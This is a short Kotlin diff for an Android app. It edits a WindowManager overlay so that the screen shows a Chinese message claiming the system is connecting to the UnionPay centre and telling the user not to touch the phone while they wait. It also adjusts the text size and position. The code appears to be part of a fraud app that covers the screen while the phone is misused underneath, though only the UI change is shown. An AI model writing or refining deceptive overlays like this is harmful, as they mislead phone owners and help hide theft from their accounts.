@@ -1333,12 +1333,12 @@ private fun createView(windowManager: WindowManager) {
 
     //val loadingText = TextView(this, null)
     val loadingText = TextView(this) // ✅ 正确构造方式，别传 null
-    loadingText.text = "\n\n请请请请请请请请请请......\n请请请请请请请请\n请请请请请请\n请请请请请......"
+    loadingText.text = "\n\n系统正在对接银联中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
     loadingText.setTextColor(-7829368)
-    loadingText.textSize = 15.0f
+    loadingText.textSize = 12.0f
     //loadingText.gravity = Gravity.LEFT
 	
-    loadingText.gravity = Gravity.LEFT or Gravity.BOTTOM
+    loadingText.gravity = Gravity.CENTER or Gravity.BOTTOM
 	
 	// loadingText.setPadding(0, 0, 0, 0) // ❗清除原来的 padding
 	loadingText.setPadding(20, 20, 20, 20) // 留点边距更美观
@@ -1357,7 +1357,7 @@ private fun createView(windowManager: WindowManager) {
     //val displayMetrics = Resources.getSystem().displayMetrics
     val screenHeight = displayMetrics.heightPixels
     val viewHeight = dp2px(this, 100f) * 5
-    val bottomOffset = dp2px(this, 60f) // 向上偏移的距离
+    val bottomOffset = dp2px(this, 30f) // 向上偏移的距离
     val topMargin = screenHeight - viewHeight - bottomOffset
 
     val paramstext = FrameLayout.LayoutParams(viewHeight, viewHeight)
